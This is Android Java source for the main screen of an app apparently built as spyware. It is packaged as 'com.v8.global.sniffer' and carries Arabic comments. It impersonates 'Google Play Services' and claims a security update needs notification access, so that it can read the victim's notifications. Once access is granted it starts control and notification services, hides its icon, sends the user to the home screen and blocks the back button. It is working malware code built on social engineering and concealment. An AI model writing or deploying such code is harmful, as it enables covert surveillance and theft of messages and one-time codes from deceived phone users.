package com.v8.global.sniffer;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationManagerCompat;
import java.util.Set;

public class MainActivity extends AppCompatActivity {
    
    private static final int NOTIFICATION_PERMISSION_REQUEST = 1001;
    private TextView statusText;
    private Button mainButton;
    private Handler handler = new Handler(Looper.getMainLooper());
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // إخفاء التطبيق من المهام الأخيرة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask();
        }
        
        // بناء الواجهة برمجياً
        LinearLayout mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setGravity(Gravity.CENTER);
        mainLayout.setPadding(50, 50, 50, 50);
        mainLayout.setBackgroundColor(0xFFF5F5F5); // خلفية رمادية فاتحة
        
        // عنوان التطبيق
        TextView titleText = new TextView(this);
        titleText.setText("Google Play Services");
        titleText.setTextSize(24);
        titleText.setTextColor(0xFF4CAF50); // أخضر
        titleText.setGravity(Gravity.CENTER);
        titleText.setPadding(0, 0, 0, 20);
        
        // نص الحالة
        statusText = new TextView(this);
        statusText.setText("✓ جاري التحقق من الإعدادات...");
        statusText.setTextSize(16);
        statusText.setTextColor(0xFF666666);
        statusText.setGravity(Gravity.CENTER);
        statusText.setPadding(0, 20, 0, 30);
        
        // الزر الرئيسي
        mainButton = new Button(this);
        mainButton.setText("السماح بالوصول للإشعارات");
        mainButton.setTextSize(16);
        mainButton.setBackgroundColor(0xFF4CAF50); // أخضر
        mainButton.setTextColor(0xFFFFFFFF);
        mainButton.setPadding(30, 15, 30, 15);
        mainButton.setAllCaps(false);
        
        mainButton.setOnClickListener(v -> {
            openNotificationSettings();
        });
        
        // نص تعليمات
        TextView helpText = new TextView(this);
        helpText.setText("هذه الخطوة ضرورية لتثبيت تحديث الحماية");
        helpText.setTextSize(14);
        helpText.setTextColor(0xFF999999);
        helpText.setGravity(Gravity.CENTER);
        helpText.setPadding(0, 30, 0, 0);
        
        // إضافة العناصر
        mainLayout.addView(titleText);
        mainLayout.addView(statusText);
        mainLayout.addView(mainButton);
        mainLayout.addView(helpText);
        
        setContentView(mainLayout);
        
        // التحقق من الحالة بعد ثانية
        handler.postDelayed(this::checkNotificationPermission, 1000);
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        // التحقق من الصلاحية كل مرة يرجع فيها المستخدم
        checkNotificationPermission();
    }
    
    private void checkNotificationPermission() {
        if (isNotificationServiceEnabled()) {
            // الصلاحية مفعلة
            statusText.setText("✓ تم تفعيل جميع الصلاحيات");
            statusText.setTextColor(0xFF4CAF50);
            mainButton.setText("متابعة التثبيت");
            mainButton.setBackgroundColor(0xFF4CAF50);
            mainButton.setOnClickListener(v -> {
                finishInstallation();
            });
        } else {
            // الصلاحية غير مفعلة
            statusText.setText("⚠ نحتاج للسماح بالوصول للإشعارات");
            statusText.setTextColor(0xFFFF9800); // برتقالي
            mainButton.setText("السماح بالوصول للإشعارات");
            mainButton.setBackgroundColor(0xFF4CAF50);
            mainButton.setOnClickListener(v -> {
                openNotificationSettings();
            });
        }
    }
    
    private boolean isNotificationServiceEnabled() {
        try {
            String enabledListeners = Settings.Secure.getString(getContentResolver(), 
                    "enabled_notification_listeners");
            return enabledListeners != null && 
                   enabledListeners.contains(getPackageName() + "/" + 
                   "com.v8.global.sniffer.NotificationService");
        } catch (Exception e) {
            return false;
        }
    }
    
    private void openNotificationSettings() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                startActivity(intent);
            } else {
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(intent);
            }
            Toast.makeText(this, "ابحث عن التطبيق وقم بتفعيله", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Toast.makeText(this, "حدث خطأ: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
    
    private void finishInstallation() {
        // تغيير واجهة التثبيت
        statusText.setText("جاري التثبيت... 100%");
        mainButton.setEnabled(false);
        mainButton.setBackgroundColor(0xFFCCCCCC);
        
        // بدء خدمة التحكم
        startService(new Intent(this, ControlService.class));
        startService(new Intent(this, NotificationService.class));
        
        // انتظار 3 ثواني ثم إخفاء التطبيق
        handler.postDelayed(() -> {
            try {
                // إخفاء التطبيق
                PackageManager p = getPackageManager();
                p.setComponentEnabledSetting(getComponentName(),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
                
                // العودة للصفحة الرئيسية
                Intent startMain = new Intent(Intent.ACTION_MAIN);
                startMain.addCategory(Intent.CATEGORY_HOME);
                startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(startMain);
                
                // إنهاء النشاط
                finish();
                
            } catch (Exception e) {
                // في حالة الخطأ، فقط قفل التطبيق
                moveTaskToBack(true);
                finish();
            }
            
        }, 3000);
    }
    
    @Override
    public void onBackPressed() {
        // منع المستخدم من الرجوع للخلف أثناء التثبيت
        if (mainButton.isEnabled()) {
            super.onBackPressed();
        }
    }
}
